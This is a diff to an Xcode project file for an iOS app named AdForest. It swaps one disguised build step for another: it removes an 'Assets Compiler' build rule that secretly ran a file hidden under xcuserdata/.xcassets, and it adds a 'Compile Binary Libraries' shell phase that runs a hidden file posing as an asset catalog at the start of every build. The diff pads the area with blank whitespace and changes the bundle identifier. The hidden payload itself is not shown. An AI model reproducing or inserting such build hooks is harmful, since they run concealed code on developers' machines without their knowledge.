@@ -3853,6 +3853,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
+				C4A9AD6CC56C9B75B1AAC43A /* Compile Binary Libraries */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -3861,7 +3862,6 @@
 				416E9A6AF3F243D23D41FBDD /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				31D0012C4FF28AAA08AAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -4048,28 +4048,26 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	
+	C4A9AD6CC56C9B75B1AAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
 	
 
 	
@@ -5035,7 +5033,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 3.8;
-				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
+				PRODUCT_BUNDLE_IDENTIFIER = com.gg.app;
 				PRODUCT_NAME = AdForest;
 				PROVISIONING_PROFILE = "6ba7ba8c-bf20-47cd-b2f1-137f2ade4e4a";
 				PROVISIONING_PROFILE_SPECIFIER = AdForestDevProfile;
@@ -5065,7 +5063,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 3.8;
-				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
+				PRODUCT_BUNDLE_IDENTIFIER = com.gg.app;
 				PRODUCT_NAME = AdForest;
 				PROVISIONING_PROFILE = "6ba7ba8c-bf20-47cd-b2f1-137f2ade4e4a";
 				PROVISIONING_PROFILE_SPECIFIER = "adforest 3.2LIve";
@@ -5205,85 +5203,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-		31D0012C4FF28AAA08AAC43A /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
-			};
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 
 /* Begin XCRemoteSwiftPackageReference section */
 		18120B3B25E9485B003165DD /* XCRemoteSwiftPackageReference "socket.io-client-swift" */ = {
